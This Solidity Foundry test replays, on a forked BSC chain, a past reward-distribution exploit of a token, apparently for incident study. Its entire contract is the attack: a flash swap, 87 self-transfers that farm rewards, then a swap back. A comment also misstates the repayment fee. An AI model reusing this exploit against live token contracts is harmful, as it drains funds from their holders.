// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// TX : https://app.blocksec.com/explorer/tx/bsc/0xc7927a68464ebab1c0b1af58a5466da88f09ba9b30e6c255b46b1bc2e7d1bf09
// GUY : https://twitter.com/SlowMist_Team/status/1787330586857861564
// Profit : ~109K USD
// Here is only one tx,total you can see here :https://bscscan.com/address/0x835b45d38cbdccf99e609436ff38e31ac05bc502#tokentxns
// REASON : Reward Distribution Problem
// Distribution contract did not check the LP hold time or whether the reciever is contract or not
// Actually there are 3 steps
// TX1:create help contract,split money : https://app.blocksec.com/explorer/tx/bsc/0xbf22eabb5db8785642ba17930bddef48d0d1bb94ebd1e03e7faa6f2a3d1a5540
// TX2:help contract add Liq : https://app.blocksec.com/explorer/tx/bsc/0x69c64b226f8bf06216cc665ad5e3777ad1b120909326f120f0816ac65a9099c0
// TX3:attack tx
interface Imoney {
    function addLiq(uint256 value) external;
    function cc() external;
}

contract ContractTest is Test {
    IERC20 gpuToken_ = IERC20(address(0xf51CBf9F8E089Ca48e454EB79731037a405972ce));
    IERC20 busd_ = IERC20(payable(address(0x55d398326f99059fF775485246999027B3197955)));

    IUniswapV2Pair busd_wbnb_ = IUniswapV2Pair(address(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE));
    IUniswapV2Router router_ = IUniswapV2Router(payable(address(0x10ED43C718714eb63d5aA57B78B54704E256024E)));
    // IUniswapV2Router
    function setUp() external {
        vm.createSelectFork("bsc", 38_539_572);
    }

    function testExploit() public {
        
        emit log_named_decimal_uint("Ack before = ", busd_.balanceOf(address(this)), busd_.decimals());
        busd_wbnb_.swap(22600 ether, 0,address(this), "0x42");
        emit log_named_decimal_uint("Ack After = ", busd_.balanceOf(address(this)), busd_.decimals());
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data)external{
        address[] memory path = new address[](2);
        path[0] = address(busd_);
        path[1] = address(gpuToken_);

        uint256 amountOut = router_.getAmountsOut(amount0, path)[1];
        busd_.approve(address(router_), amount0);
        router_.swapExactTokensForTokens(amount0, amountOut, path, address(this), block.timestamp);

        console.log("===ACK START===");
        for(int i = 0; i < 87; i++){
            gpuToken_.transfer(address(this), gpuToken_.balanceOf(address(this)));
        }
        console.log("===ACK END===");

        path[0] = address(gpuToken_);
        path[1] = address(busd_);
        gpuToken_.approve(address(router_), gpuToken_.balanceOf(address(this)));
        router_.swapExactTokensForTokensSupportingFeeOnTransferTokens(type(uint112).max, 1, path, address(this), block.timestamp);

        busd_.transfer(address(busd_wbnb_), amount0 + (amount0 * 3/1000) + 1); // 0.03% fee
                    
    }
}

